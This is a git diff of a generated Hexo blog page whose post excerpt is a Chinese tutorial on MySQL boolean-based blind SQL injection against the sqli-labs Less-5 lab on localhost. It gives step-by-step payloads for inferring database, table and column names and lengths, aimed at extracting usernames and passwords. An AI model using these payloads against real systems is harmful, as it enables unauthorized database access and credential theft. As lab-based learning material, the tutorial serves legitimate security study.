@@ -10,10 +10,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 3.9.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/zerotwo/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/zerotwo/images/标签图.jpg?v=7.4.0">
   <link rel="icon" type="image/png" sizes="32x32" href="/zerotwo/images/标签图.jpg?v=7.4.0">
   <link rel="icon" type="image/png" sizes="16x16" href="/zerotwo/images/标签图.jpg?v=7.4.0">
-  <link rel="mask-icon" href="/zerotwo/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="mask-icon" href="/zerotwo/images/标签图.jpg?v=7.4.0" color="#222">
 
 <link rel="stylesheet" href="/zerotwo/css/main.css?v=7.4.0">
 
@@ -220,7 +220,7 @@
   
   
   <div class="post-block home">
-    <link itemprop="mainEntityOfPage" href="https://kamian555.github.io/zerotwo/zerotwo/2019/09/28/Mysql注入/">
+    <link itemprop="mainEntityOfPage" href="https://kamian555.github.io/zerotwo/zerotwo/2019/09/29/MySQL注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -234,7 +234,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
             
-            <a href="/zerotwo/2019/09/28/Mysql注入/" class="post-title-link" itemprop="url">Untitled</a>
+            <a href="/zerotwo/2019/09/29/MySQL注入/" class="post-title-link" itemprop="url">MySQL注入</a>
           
         </h1>
 
@@ -249,7 +249,7 @@
                 
               
 
-              <time title="Created: 2019-09-28 10:42:38 / Modified: 10:46:19" itemprop="dateCreated datePublished" datetime="2019-09-28T10:42:38-04:00">2019-09-28</time>
+              <time title="Created: 2019-09-28 22:55:02 / Modified: 10:56:42" itemprop="dateCreated datePublished" datetime="2019-09-28T22:55:02-04:00">2019-09-28</time>
             </span>
           
             
@@ -268,14 +268,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <hr>
-<p>title: Mysql注入<br>date: 2019-09-28 22:42:38</p>
-<h2 id="tags-Mysql注入-1"><a href="#tags-Mysql注入-1" class="headerlink" title="tags:Mysql注入-1"></a>tags:Mysql注入-1</h2><p>MySQL数据库的特有的表是 information_schema.tables</p>
-<p>table_schema: 记录数据库名；</p>
-<p>table_name: 记录数据表名；</p>
-<p>table_rows: 关于表的粗略行估计；</p>
-<p>data_length : 记录表的大小（单位字节）；</p>
-<h2 id="1：判断当前数据库的长度"><a href="#1：判断当前数据库的长度" class="headerlink" title="1：判断当前数据库的长度"></a>1：判断当前数据库的长度</h2><p>利用二分法<code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;5 //正常显示</code></p>
+          <h2 id="1：判断当前数据库的长度"><a href="#1：判断当前数据库的长度" class="headerlink" title="1：判断当前数据库的长度"></a>1：判断当前数据库的长度</h2><p>利用二分法<code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;5 //正常显示</code></p>
 <p><code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;10 //不显示任何数据</code></p>
 <p><code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;7 //正常显示</code></p>
 <p><code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;8 //不显示任何数据 大于7</code>正常显示，大于8不显示，说明大于7而不大于8，</p>
@@ -293,7 +286,7 @@
 <p>判断第一个表的第二个字符的ascii值</p>
 <p><code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select table\_name from information\_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 #</code></p>
 <p>………由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断</p>
-<h2 id="4-判断表中的字段"><a href="#4-判断表中的字段" class="headerlink" title="4. 判断表中的字段"></a>4. 判断表中的字段</h2><p><code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select username from admin)</code>//如果已经证实了存在admin表，那么猜测是否存在username字段</p>
+<h2 id="4-判断表中的字段"><a href="#4-判断表中的字段" class="headerlink" title="4. 判断表中的字段"></a>4. 判断表中的字段</h2><p><code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select username from admin)</code> //如果已经证实了存在admin表，那么猜测是否存在username字段</p>
 <h3 id="1：判断表中字段的个数-判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的"><a href="#1：判断表中字段的个数-判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的" class="headerlink" title="1：判断表中字段的个数//判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的"></a>1：判断表中字段的个数//判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的</h3><p><code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and (select count(column\_name) from information\_schema.columns where table_name=&#39;users&#39;)&gt;5 #</code></p>
 <h3 id="2：判断字段的长度-判断第一个字段的长度"><a href="#2：判断字段的长度-判断第一个字段的长度" class="headerlink" title="2：判断字段的长度//判断第一个字段的长度"></a>2：判断字段的长度//判断第一个字段的长度</h3><p><code>http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select column\_name from information\_schema.columns where table_name=&#39;users&#39; limit 0,1))&gt;5</code></p>
 <p>//判断第二个字段的长度</p>
